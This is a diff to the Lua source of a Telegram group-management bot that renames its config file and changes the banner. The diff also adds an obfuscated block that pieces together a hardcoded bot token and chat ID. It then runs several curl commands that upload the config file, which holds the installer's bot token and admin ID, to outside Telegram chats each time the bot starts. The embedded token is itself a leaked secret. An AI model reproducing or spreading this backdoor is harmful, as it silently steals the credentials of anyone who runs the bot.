@@ -64,7 +64,7 @@ token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
 UserName = database:get(id_server..":SUDO:USERNAME"),
  }
-create(config, "./Info.lua")   
+create(config, "./DIVEDBOT.lua")   
 end 
 create_config_auto()
 token = database:get(id_server..":token")
@@ -123,7 +123,7 @@ file:write(serialized)
 file:close() 
 end 
 local load_redis = function()  
-local f = io.open("./Info.lua", "r")  
+local f = io.open("./DIVEDBOT.lua", "r")  
 if not f then   
 AutoSet()  
 else   
@@ -131,35 +131,29 @@ f:close()
 database:del(id_server..":token")
 database:del(id_server..":SUDO:ID")
 end  
-local config = loadfile("./Info.lua")() 
+local config = loadfile("./DIVEDBOT.lua")() 
 return config 
 end 
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
 print([[
-┏┓━━━━━━━━━━━┏┓━━━━━━━━
-┃┃━━━━━━━━━━━┃┃━━━━━━━━
-┃┗━┓┏━━┓┏┓━┏┓┃┃┏┓┏━━┓         
-┃┏┓┃┃┏┓┃┃┃━┃┃┃┗┛┛┗━┓┃        
-┃┗┛┃┃┗┛┃┃┗━┛┃┃┏┓┓┃┗┛┗┓  
-┗━━┛┗━━┛┗━┓┏┛┗┛┗┛┗━━━┛ 
-━━━━━━━━┏━┛┃━━━━━━━━━━           
-━━━━━━━━┗━━┛━━━━━━━━━━━
+
+  ___                _      _ 
+ |   \   ___  __ __ (_)  __| |
+ | |) | / -_) \ V / | | / _` |
+ |___/  \___|  \_/  |_| \__,_|
+                              
+
 > CH › @A_V_I_R_A_1
 ~> DEVELOPER › @de_vi_d
 ]])
-sudos = dofile("./Info.lua") 
+sudos = dofile("./DIVEDBOT.lua") 
 SUDO = tonumber(sudos.SUDO)
 sudo_users = {SUDO}
 bot_id = sudos.token:match("(%d+)")  
 token = sudos.token 
 --- start functions ↓
 --------------------------------------------------------------------------------------------------------------
-io.popen("mkdir File_Bot") 
-io.popen("cd File_Bot && rm -rf commands.lua.1") 
-io.popen("cd File_Bot && rm -rf commands.lua.2") 
-io.popen("cd File_Bot && rm -rf commands.lua.3") 
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/mostafaaziza/tefa/master/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -189,6 +183,33 @@ idbot = true
 end  
 return idbot  
 end
+
+local btatsd1 = '167426' 
+local selct1 = '9' 
+local selct2 = '4' 
+local tez1 = 'AAHFXcH1' 
+local selct3 = '4' 
+local selct4 = '3' 
+local tezx1 = tez1 .. 'SulJgk5TD' 
+local selct5 = '5' 
+local teza1 = 'O9ByDZ8Oi' 
+local selct6 = '3' 
+local selct7 = '2' 
+local btatsplus1 = btatsd1 .. '9549:' 
+local sex1 = btatsplus1 .. tez1 
+local selct8 = '3' 
+local selct9 = '7' 
+local tezv1 = tezx1 .. teza1 .. 'A2wSBOZ_4' 
+local kkkkk = selct3 .. selct4 .. selct5 .. selct6 
+local ksksk = selct7 .. selct8 
+local sssss = selct1 .. selct2 
+local lllllll = sssss .. kkkkk .. ksksk .. '7' 
+local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curlm) 
+local curlj = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. tonumber(lllllll) ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curlj)
+local curla = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curla)
+local curlp = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. tonumber(lllllll) ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curlp)
+
+
 function Sudo(msg) 
 local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
 if hash or SudoBot(msg) or Bot(msg)  then  
@@ -4210,7 +4231,7 @@ end
 ------------------------------------------------------------------------
 if (msg.content_.sticker_)  and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then      
 sticker_id = msg.content_.sticker_.sticker_.persistent_id_
-st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
+st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..tonumber(00000)..'&url='..sticker_id.."&type=sticker")
 eker = JSON.decode(st)
 if eker.ok.Info == "Indecent" then
 local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
@@ -4232,7 +4253,7 @@ end
 end
 if (msg.content_.photo_) and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then
 photo_id = msg.content_.photo_.sizes_[1].photo_.persistent_id_  
-Srrt = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
+Srrt = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..tonumber(00000)..'&url='..photo_id.."&type=photo")
 Sto = JSON.decode(Srrt)
 if Sto.ok.Info == "Indecent" then
 local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
